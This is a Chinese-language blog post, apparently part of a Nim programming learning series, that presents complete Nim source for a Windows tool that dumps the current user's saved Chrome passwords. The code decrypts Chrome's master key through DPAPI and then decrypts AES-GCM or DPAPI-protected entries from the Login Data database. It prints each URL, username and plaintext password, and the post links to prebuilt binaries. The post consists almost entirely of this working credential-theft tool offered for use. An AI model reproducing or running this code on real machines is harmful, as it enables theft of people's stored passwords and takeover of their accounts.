# 读取 chrome 浏览器密码（nim学习系列）

> * 全版本 chrome 浏览器支持
> * 仅支持 windows 系统下使用
> * 需要 sqlite3_32.dll或者sqlite3_64.dll
> * 读取当前用户 chrome 浏览器密码

## 源代码 chromepwd.nim

``` chromepwd.nim
#[
Author: StudyCat
Blog: https://www.cnblogs.com/studycat
Github: https://github.com/StudyCat404/myNimExamples
License: BSD 3-Clause
]#

import os
import json
import base64
import winim/inc/wincrypt
import sqlite3
import nimcrypto/[rijndael, bcmode]
import winim/lean

proc cryptUnprotectData(data: openarray[byte]): string =
    var dataIn, dataOut: DATA_BLOB
    dataIn.cbData = int32(data.len)
    dataIn.pbData = unsafeaddr data[0]
    
    if CryptUnprotectData(addr dataIn, nil, nil, nil, nil, 0, addr dataOut) != 0:
        result.setLen(dataOut.cbData)
        if dataOut.cbData != 0:
            copyMem(addr result[0], dataOut.pbData, dataOut.cbData)   
        LocalFree(cast[HLOCAL](dataOut.pbData))

proc getMasterKey(): string =
    let filename = getEnv("USERPROFILE") & r"\AppData\Local\Google\Chrome\User Data\Local State"
    if fileExists(filename):
        let contents = readFile(filename)
        let jsonNode = parseJson(contents)
        let masterKeyB64 = jsonNode["os_crypt"]["encrypted_key"].getStr()
        let decoded = decode(masterKeyB64)
        var masterKey = decoded.substr(5)
        result = cryptUnprotectData(toOpenArrayByte(masterKey, 0, masterKey.len() - 1 ))


proc passDecrypt(data: openarray[byte]): string =
    #echo data
    var key {.global.}: string
    
    if data[0 ..< 3] == [byte 118, 49, 48]:   #chrome version > 80
        if key.len() == 0:
            key = getMasterKey()
            
        var
            ctx: GCM[aes256]
            aad: seq[byte]
            iv = data[3 ..< 3 + 12]
            encrypted = data[3 + 12 ..< data.len() - 16]
            tag = data[data.len() - 16 ..< data.len()]
            dtag: array[aes256.sizeBlock, byte]
            
        if encrypted.len() > 0:
            result.setLen(encrypted.len())
            ctx.init(key.toOpenArrayByte(0, key.len() - 1), iv, aad)
            ctx.decrypt(encrypted, result.toOpenArrayByte(0, result.len() - 1))
            ctx.getTag(dtag)
            assert(dtag == tag)
    else:
        result = cryptUnprotectData(data)   #chrome version < 80
        
proc main() =
    let filename = getEnv("USERPROFILE") & r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    let tempFileName = getTempDir() & "Login Data"
    copyFile(filename, tempFileName)
    if fileExists(tempFileName):
        var
            db: PSqlite3
            rc: int
            tail : ptr cstring
            stmt: PStmt = nil
            zSql: cstring = "SELECT action_url, username_value, password_value FROM logins"
            
        discard open(tempFileName, db)
        var msg = prepare(db, zSql, -1, stmt, tail)
        if msg == SQLITE_OK:
            rc = stmt.step()
            while rc == SQLITE_ROW :
                echo "Url: ", column_text(stmt, 0)
                echo "User: ", column_text(stmt, 1)
                var blobData: seq[byte]
                blobData.setLen(int(column_bytes(stmt, 2)))
                copyMem(unsafeAddr(blobData[0]), column_blob(stmt, 2), int(column_bytes(stmt, 2)))
                echo "Pass: ", passDecrypt(blobData)
                echo ""
                
                rc = stmt.step()
                
            discard finalize(stmt)
            discard close(db)
        
    removeFile(tempFileName)
    
when isMainModule:
    when defined(windows):
        main()       
```

截图：

![截图](https://files-cdn.cnblogs.com/files/StudyCat/chromepwd.bmp)

工具下载链接：  

[chromepwd64.exe](https://github.com/StudyCat404/myNimExamples/blob/main/examples/chromepwd64.exe)  

[sqlite3_64.dll](https://github.com/StudyCat404/myNimExamples/blob/main/examples/sqlite3_64.dll)  

